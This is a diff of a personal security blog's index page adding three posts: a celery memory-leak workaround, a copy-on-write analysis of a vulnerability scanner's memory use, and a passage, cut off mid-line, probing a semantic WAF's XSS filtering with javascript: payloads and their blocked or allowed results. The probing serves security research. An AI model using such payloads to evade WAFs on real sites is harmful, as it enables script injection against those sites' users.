@@ -125,12 +125,12 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">53</span>
+          <span class="site-state-item-count">55</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-count">23</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -159,6 +159,262 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-01-02-%E8%A7%A3%E5%86%B3%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E7%9A%84%E9%80%9A%E7%94%A8%E6%80%9D%E8%B7%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022-01-02-%E8%A7%A3%E5%86%B3%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E7%9A%84%E9%80%9A%E7%94%A8%E6%80%9D%E8%B7%AF/" class="post-title-link" itemprop="url">解决内存泄漏的通用思路</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-01-02 12:28:14 / 修改时间：14:02:54" itemprop="dateCreated datePublished" datetime="2022-01-02T12:28:14+08:00">2022-01-02</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>之前在做扫描器时，有一个功能是：生成任务实例。</p>
+<p>使用场景是：用户在web页面上点击启动按钮，就可以立即运行指定的任务(比如指定哪些POC对哪些资产做漏洞扫描)；定期运行扫描任务</p>
+<p>因为”生成任务实例”时可能需要比较久的时间，并且有很多其他业务逻辑，所以这里由后台进程来生成任务实例，实现”异步”的效果。</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/147867288-630e0ec9-84fa-499c-a6b6-17853e58dfa4.png" alt="image"></p>
+<p>在线上发现一个问题：”后台创建任务实例的进程”运行一段时间后，内存占用越来越大。</p>
+<p>虽然当时能力有限，并没有找到”内存不断增长”的原因，但是最终还是解决了这个问题。</p>
+<h1 id="怎么解决的"><a href="#怎么解决的" class="headerlink" title="怎么解决的"></a>怎么解决的</h1><p>我当时的想法是，虽然找不到原因，但是重启大法好啊，我可以处理N个任务后，删除这个”后台创建任务实例的进程”再新建进程。</p>
+<p>项目中我用的是python语言，<a target="_blank" rel="noopener" href="https://github.com/celery/celery">celery框架</a>，刚好celery提供了两个参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@50f41bfab20a:&#x2F;# celery worker --help</span><br><span class="line">...</span><br><span class="line">--max-tasks-per-child MAX_TASKS_PER_CHILD, --maxtasksperchild MAX_TASKS_PER_CHILD</span><br><span class="line">                      Maximum number of tasks a pool worker can execute</span><br><span class="line">                      before it&#39;s terminated and replaced by a new worker.</span><br><span class="line">--max-memory-per-child MAX_MEMORY_PER_CHILD, --maxmemperchild MAX_MEMORY_PER_CHILD</span><br><span class="line">                      Maximum amount of resident memory, in KiB, that may be</span><br><span class="line">                      consumed by a child process before it will be replaced</span><br><span class="line">                      by a new one. If a single task causes a child process</span><br><span class="line">                      to exceed this limit, the task will be completed and</span><br><span class="line">                      the child process will be replaced afterwards.</span><br><span class="line">                      Default: no limit.</span><br></pre></td></tr></table></figure>
+
+<p>可以指定内存超过多少、处理多少任务后，生成新的进程来处理任务。</p>
+<p>我就靠这两个参数解决​了问题。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>后面我在做安全评估时，发现其他业务线有php语言开发的程序也是这种模式：使用子进程处理任务，处理N个任务后，”重新创建”子进程。</p>
+<p>所以，凡是业务场景允许”进程重启”的，应该都可以用这种模式来解决”内存泄漏”。</p>
+<p>难解决的是”长时间持续运行的程序”出现的”内存泄漏”</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/400104113/answer/1278541405">既然每个程序占用的内存都是操作系统管理的，为什么内存泄漏还是个问题？ - pansz的回答 - 知乎</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E6%89%AB%E6%8F%8F%E5%99%A8%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90%E6%A1%88%E4%BE%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E6%89%AB%E6%8F%8F%E5%99%A8%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90%E6%A1%88%E4%BE%8B/" class="post-title-link" itemprop="url">扫描器性能分析案例</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 21:32:40" itemprop="dateCreated datePublished" datetime="2021-12-26T21:32:40+08:00">2021-12-26</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-01-16 17:09:55" itemprop="dateModified" datetime="2022-01-16T17:09:55+08:00">2022-01-16</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>之前文章结论有问题，修正后形成本文。原文如下</p>
+<h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>之前线上的漏洞扫描器遇到一个问题：扫描刚开始时，内存占用不超过200M，但在扫描过程中，扫描器会占用超过10G以上内存。因为同一台机器上还有其他的服务，可用物理内存也只有10G左右，所以扫描过程中就没有可用内存了，机器负载(uptime命令查看)也会很高。</p>
+<p>排查”怎么导致10G内存占用”也比较简单：因为每次内存占用过高时，都能看到机器上有上百个<code>java -jar ysoserial.jar</code>进程(扫描器开的)，所以可以知道是 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/14ade5985bfc1db1b5ccb3ae4f661178">shiro-550</a> 这个poc导致的内存消耗。</p>
+<p>先说明一下为什么有上百个<code>java -jar ysoserial.jar</code>进程：从 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/14ade5985bfc1db1b5ccb3ae4f661178">shiro-550</a> 代码中也可以看到，我在python中使用子进程调用<code>ysoserial</code>来生成shiro测试payload。因为扫描器使用协程池(<code>gevent.pool</code>)实现并发，所以扫描器执行到shiro poc时，会产生很多个<code>ysoserial</code>子进程。</p>
+<p>本文不讨论这个问题的解决办法(你可以看<a target="_blank" rel="noopener" href="https://paper.seebug.org/1290/">Shiro-550 PoC 编写日记</a>),而是分析为什么这里python中的子进程会消耗10G这么多的内存。</p>
+<p>我的分析思路：写一个demo复现，然后分析demo</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>复现</p>
+<p>写个demo复现一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import subprocess</span><br><span class="line">import gevent.monkey</span><br><span class="line">gevent.monkey.patch_all()</span><br><span class="line"></span><br><span class="line">import gevent.pool</span><br><span class="line"></span><br><span class="line">def test(_):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;python&#39;, &quot;&#x2F;tmp&#x2F;big.py&quot;], stdout&#x3D;subprocess.PIPE)   # big.py是一个60M左右的的python文件</span><br><span class="line">    print(popen.stdout.read())</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    pool &#x3D; gevent.pool.Pool(100)    # 100个协程</span><br><span class="line"></span><br><span class="line">    _ &#x3D; &quot;x,&quot; * 300</span><br><span class="line">    pool.map(test, _.split(&quot;,&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>/tmp/big.py</code>是如下脚本生成的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line"></span><br><span class="line">size &#x3D; 60 * 1024 * 1024  # 60M</span><br><span class="line">fname &#x3D; &quot;&#x2F;tmp&#x2F;big.py&quot;</span><br><span class="line"></span><br><span class="line">template &#x3D; &quot;&quot;&quot;</span><br><span class="line">a&#x3D;&quot;%s&quot;</span><br><span class="line">while True:</span><br><span class="line">    pass</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">with open(fname, &quot;w&quot;) as f:</span><br><span class="line">    f.write(template % (&#39;x&#39;*size))</span><br></pre></td></tr></table></figure>
+
+<p>下面在机器上观察demo脚本对物理内存占用的影响</p>
+</li>
+<li><p>观察</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/147537918-b056a863-26b1-4a89-9380-89c75dc16eb8.png" alt="image"></p>
+<p>可以观察到：在执行脚本前，机器还有10G可用的物理内存；执行脚本后，生成了100个big.py进程，内存也从11203M减少到4886M。</p>
+<p>内存为什么会减少这么多呢？其实算一算就很容易找到原因：内存减少了约6G，而big.py脚本大小约60M、总共有100个big.py进程，所以应该是每个<code>python big.py</code>进程会占用60M物理内存。</p>
+<p>想一想也很合理：执行<code>python big.py</code>时，python应该是将<code>big.py</code>文件全部读到内存中了。</p>
+</li>
+<li><p>回到最开始的问题</p>
+<p>可以推测执行<code>java -jar ysoserial.jar</code>命令时，java也会将<code>ysoserial.jar</code>文件读到内存。</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/147551785-e2bc1537-c359-4f79-bc0a-cd149b0189fe.png" alt="image"></p>
+<p>又因为<code>ysoserial.jar</code>文件接近50M，所以有200个<code>java -jar ysoserial.jar</code>子进程时，就会消耗至少10G的内存。</p>
+<p>到这里，我的疑问也解开了。</p>
+</li>
+<li><p>总结</p>
+<p>多进程执行<code>java -jar xxx.jar</code>或者<code>python xxx.py</code>时，需要注意<code>xxx.jar</code>和<code>xxx.py</code>的大小会对内存占用有影响。</p>
+<p>看到这里，我不知道你会不会心想这个问题也太简单了吧。</p>
+<p>确实，在写出验证demo之后，很容易得到结论。但是在写出demo之前，我把问题想错了导致走了点弯路。下面我来说一下我走弯路时的过程以及学到的东西。</p>
+</li>
+</ul>
+<h1 id="弯路"><a href="#弯路" class="headerlink" title="弯路"></a>弯路</h1><ul>
+<li><p>最开始的思路</p>
+<p>其实我最开始是怀疑”内存占用10G”以上的原因是：python生成子进程时会占用和父进程一样大小的物理内存,而父进程(也就是扫描器进程)本身因为会读了一些资源文件，所以本身是占用了比较大的物理内存。这样当父进程(扫描器进程)生成200个子进程(<code>java -jar ysoserial.jar</code>)时,就会占用200*40M(8G)的内存。似乎这个数字也将近10G，也能差不多对应上问题背景。</p>
+<p>现在回过头看之前的这个原因猜测，有两点问题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* python生成子进程时因为有操作系统&quot;写时复制&quot;的机制，所以不会有200个子进程就占用200*40M的内存</span><br><span class="line">* &#96;subprocess.Popen&#96;生成的子进程内存占用和父进程无关，&#96;multiprocessing.Process&#96;生成的子进程内存占用和父进程是一样的</span><br></pre></td></tr></table></figure>
+
+<p>关于”写时复制”机制，可能你和我最开始一样不了解，下面我带你来验证一下这个机制是怎么回事。</p>
+</li>
+<li><p>“写时复制”机制</p>
+<p>linux上和生成子进程有关的系统调用有fork、clone，这两系统调用都会有”写时复制”机制。</p>
+<p>按照我自己的理解，”写时复制”机制就是刚生成子进程时，子进程和父进程 关于”用户态虚拟地址”到”物理地址”的映射关系是一样的。然后，在发生写操作时（无论父进程还是子进程），操作系统都会重新映射。</p>
+<p>因为映射到同一个物理页，所以不会导致物理内存变少。</p>
+<p>我们可以用crash工具来验证一下这个机制</p>
+</li>
+<li><p>crash工具验证fork时的”写时复制”机制</p>
+<p>准备测试代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">#define SIZE 4*1024*1024</span><br><span class="line">int main()&#123;</span><br><span class="line">  void *addr &#x3D; mmap(NULL, (size_t)SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    &#x2F;&#x2F; 申请4M内存</span><br><span class="line">  memset(addr, &#39;A&#39;, SIZE);</span><br><span class="line"></span><br><span class="line">  printf(&quot;main: %p\n&quot;, addr);</span><br><span class="line"></span><br><span class="line">  while(1)&#123;</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    if (fork() &#x3D;&#x3D; 0)&#123;</span><br><span class="line">      printf(&quot;sub: %p\n&quot;, addr);</span><br><span class="line">      while (1)&#123;</span><br><span class="line">        sleep(5);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过crash工具来验证，可以看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 因为子进程和父进程都没有对addr内存做写操作，所以子进程和父进程中addr映射到同一个物理地址</span><br><span class="line">* 虽然代码中mmap用了&#96;PROT_WRITE&#96;标志，但是子进程和父进程addr内存标志中都没有RW可写标志</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://user-images.githubusercontent.com/1846319/147578536-1b05bbbc-6007-4e8d-abd2-09ce782d9af9.png" alt="image"></p>
+<p>你也可以修改代码，在子进程中修改addr指向的内存，然后用crash观察”物理地址”和”内存标志”的变化，来体会”写时复制”。</p>
+<p>关于crash工具的安装和使用，你可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/GGnpYk30k-eUIULv3a_PKQ">借助crash工具理解linux系统的内存分配</a></p>
+</li>
+<li><p><code>multiprocessing.Process</code>是否会”写时复制”？</p>
+<p><code>multiprocessing.Process</code>是用clone系统调用而不是fork系统调用（你可以用strace命令验证一下）</p>
+<p>我们同样可以用crash来验证<code>multiprocessing.Process</code>的子进程和父进程是否会映射到同一个物理页。先说结论：<code>multiprocessing.Process</code>同样有”写时复制”。在得到这个结论前我差点以为<code>multiprocessing.Process</code>是没有”写时复制”机制的，因为我发现a变量地址对应的物理地址在”父进程”和”子进程”中是不同的。</p>
+<p>下面我来说一下我是怎么测试的。</p>
+<p>先准备测试代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp tmp]# cat v.py</span><br><span class="line">from multiprocessing import Process</span><br><span class="line"></span><br><span class="line">a &#x3D; b&quot;abc&quot;</span><br><span class="line">print(&quot;main&quot;, id(a))  # id函数返回变量a的虚拟地址</span><br><span class="line"></span><br><span class="line">def t():</span><br><span class="line">  while True:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">p &#x3D; Process(target&#x3D;t, args&#x3D;&#39;&#39;)</span><br><span class="line">p.start()</span><br></pre></td></tr></table></figure>
+
+<p>然后用crash查看父子进程中a变量对应的物理地址，可以看到：父子进程a变量映射到不同的物理地址。</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/147625166-686af767-e186-4591-8a1f-cc9ad156eb4f.png" alt="image"></p>
+<p>上面的现象让我一度以为<code>multiprocessing.Process</code>是没有”写时复制”机制。但是因为我之前验证了”clone系统调用”有”写时复制”，所以我怀疑<code>multiprocessing.Process</code>因为啥原因所以没有”写时复制”？</p>
+<p>为了解决上面的疑问，我在python进程的clone系统调用下断点，在刚调用clone时用crash查看页表</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/147626931-bd780cde-cef8-47b8-be2c-6a977ed2a5c3.png" alt="image"></p>
+<p>可以看到，在clone刚被调用时，父子进程中a变量映射到同一个物理地址。</p>
+<p>到目前为止有两个现象：在clone刚被调用时，父子进程中a变量映射到同一个物理地址；<code>v.py</code>运行后，父子进程中a变量映射到不同的物理地址。</p>
+<p>我猜测：clone被调用后，<code>v.py</code>中后面修改了a变量，导致进程中a变量地址被映射到一个新的物理地址上。因为我的猜测也符合”写时复制”机制流程，所以直觉上应该是这样。</p>
+<p>但是现在还有一个问题：你看我们前面的<code>v.py</code>代码，它并没有修改a变量。那么a变量是被谁修改了呢。</p>
+<p>为了搞清楚这最后一个问题，我用gdb查看a变量在内存中长什么样，然后发现父子进程a变量的”引用计数”不相同，如下<code>ob_refcnt</code>字段值就是”引用计数”</p>
+<blockquote>
+<p>“引用计数”是CPython用来做”垃圾管理”的一个机制，当对象被创建或者被当作参数传递时，对象的引用计数会加1。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ps aux|grep v.py</span><br><span class="line">root     21465  0.0  0.0 144332  8604 pts&#x2F;1    S+   12:34   0:00 python3 v.py   &#x2F;&#x2F; 父进程</span><br><span class="line">root     21466 93.0  0.0 144332  6460 pts&#x2F;1    R+   12:34   6:19 python3 v.py   &#x2F;&#x2F; 子进程</span><br><span class="line">[root@instance-fj5pftdp ~]# gdb --batch -p 21465 -ex &#39;print *(PyBytesObject*) 140443328409848&#39;    &#x2F;&#x2F; 140443328409848是a变量地址</span><br><span class="line">...</span><br><span class="line">$1 &#x3D; &#123;ob_base &#x3D; &#123;ob_base &#x3D; &#123;ob_refcnt &#x3D; 1, ob_type &#x3D; 0x7fbb8a46dfa0 &lt;PyBytes_Type&gt;&#125;, ob_size &#x3D; 3&#125;, ob_shash &#x3D; 4892354780606192576, ob_sval &#x3D; &quot;a&quot;&#125;</span><br><span class="line">...</span><br><span class="line">[root@instance-fj5pftdp ~]# gdb --batch -p 21466 -ex &#39;print *(PyBytesObject*) 140443328409848&#39;</span><br><span class="line">...</span><br><span class="line">$1 &#x3D; &#123;ob_base &#x3D; &#123;ob_base &#x3D; &#123;ob_refcnt &#x3D; 3, ob_type &#x3D; 0x7fbb8a46dfa0 &lt;PyBytes_Type&gt;&#125;, ob_size &#x3D; 3&#125;, ob_shash &#x3D; 4892354780606192576, ob_sval &#x3D; &quot;a&quot;&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>可以推测CPython在clone之后修改了a变量的”引用计数”，因此发生了”写时复制”，父子进程中a变量地址指向的物理地址也不同。</p>
+<p>如果你有兴趣，可以将测试代码的<code>a = b&quot;abc&quot;</code>修改成<code>a = b&quot;a&quot; * 1024 * 1024 * 1024</code>，然后观察一下a变量的1G内存，就能发现父子进程的a变量只有第一个物理页是不同的，其他物理页都是相同的。</p>
+</li>
+<li><p><code>subprocess.Popen</code>和<code>multiprocessing.Process</code>区别</p>
+<p>做完上面实验我体会的差别：<code>subprocess.Popen</code>会调用<code>execve</code>系统调用，这个系统调用应该会将”页表映射”关系都换掉，所以父进程和子进程的内存没啥关系。</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>多进程执行<code>java -jar xxx.jar</code>或者<code>python xxx.py</code>时，需要注意<code>xxx.jar</code>和<code>xxx.py</code>的大小会对内存占用有影响</li>
+<li>fork、clone系统调用都有”写时复制”机制，可以用crash工具来观察这个机制；”写时复制”可以节约物理内存</li>
+<li><code>multiprocessing.Process</code>生成子进程时，有可能因为”引用计数”被修改，所以子进程存储变量实例的第一个物理页可能和父进程不同</li>
+<li><code>subprocess.Popen</code>会调用<code>execve</code>系统调用，这个系统调用应该会将”页表”都换掉，所以父进程和子进程的内存没啥关系</li>
+</ul>
+<p>在研究这个问题的过程中，我了解了CPython对象的数据结构、写时复制，希望你也有收获。</p>
+<p>关于gdb的使用，你可以看<a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/set-detach-on-fork.html">文档</a></p>
+<hr>
+<h1 id="更正"><a href="#更正" class="headerlink" title="更正"></a>更正</h1><p>上面文章中下面的结论有部分错误：</p>
+<ul>
+<li>多进程执行<code>java -jar xxx.jar</code>或者<code>python xxx.py</code>时，需要注意<code>xxx.jar</code>和<code>xxx.py</code>的大小会对内存占用有影响</li>
+</ul>
+<p>实际上<code>java -jar xxx.jar</code>和<code>python xxx.py</code>还是有些不同：<code>xxx.jar</code>是jvm通过mmap系统调用映射”共享文件页”到内存中，所以多个进程会共享同一份内存; <code>xxx.py</code>并不会被python解释器通过mmap做”文件页”映射。</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/149651727-18ca7bdc-aac6-4b2f-b49d-f3895aba0b91.png" alt="image"></p>
+<p><img src="https://user-images.githubusercontent.com/1846319/149651655-bf29e24c-e881-41ea-a949-2a120abfbcf5.png" alt="image"></p>
+<p>原文中因为自己想当然地以为”jvm”会和”python解释器”一样，偷了点懒就没有动手验证，所以得出错误的结论。</p>
+<p>PS：想问一下有没有读者愿意帮我校对文章内容？可以在公众号聊天框发消息给我</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -301,6 +557,137 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(3)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(3)/" class="post-title-link" itemprop="url">细品某语义waf的xss防护(3)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><ul>
+<li>经过前期调研，标签中下面的危险属性可以用来做xss攻击：<ul>
+<li>href属性</li>
+<li>src属性</li>
+<li>on事件属性</li>
+<li>srcdoc属性</li>
+<li>xlink:href</li>
+<li>action</li>
+<li>formaction</li>
+<li>data (object标签)</li>
+</ul>
+</li>
+</ul>
+<p>假设攻击场景如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">漏洞输出位置是 &lt;标签 危险属性&#x3D;&quot;用户输出可控位置&quot;&gt;，比如：</span><br><span class="line">&lt;a href&#x3D;&quot;用户输出可控位置&quot;&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;用户输出可控位置&quot;&gt;</span><br><span class="line"></span><br><span class="line">攻击者不闭合属性值时利用xss攻击,如:</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>经过前期调研，在属性值中有下面这些利用方式：</p>
+<ul>
+<li>javascript:js代码</li>
+<li>js代码   （on事件属性）</li>
+<li>data:text/html</li>
+<li>script脚本地址 (script标签的src属性)</li>
+</ul>
+<p>在这个场景下，不考虑其他的利用手段，验证厂商语义waf的安全防护策略</p>
+<p>分析思路：</p>
+<ul>
+<li>针对在属性中每一种利用方式测试，根据拦截情况推测安全防护策略</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="javascript-js代码"><a href="#javascript-js代码" class="headerlink" title="javascript:js代码"></a>javascript:js代码</h2><p>攻击场景是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&#x2F;href&#x3D;&quot;用户输出可控点&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;javascript:console.xxx()   拦截</span><br><span class="line">a&#x3D;javascript:console.log(111);xx&#123;&#96;faji(   不拦截  说明判断了js语法是否正确</span><br><span class="line">a&#x3D;javascript:xxx.consol(11)  不拦截</span><br><span class="line">a&#x3D;javascript:xxx.console(11)  拦截   说明危险对象和危险函数一样，在同一个黑名单里。</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:xxx.consoleeee(11)    拦截</span><br><span class="line">a&#x3D;javascript:xxx.xxxconsoleeee(11) 不拦截  说明判断是否在黑名单中采用前缀判断</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:xxxxx()   不拦截</span><br><span class="line">a&#x3D;javascript:alertxxx(11) 拦截</span><br><span class="line">a&#x3D;javascript:alert()   拦截   说明逻辑是 是否存在函数调用 &amp;&amp; 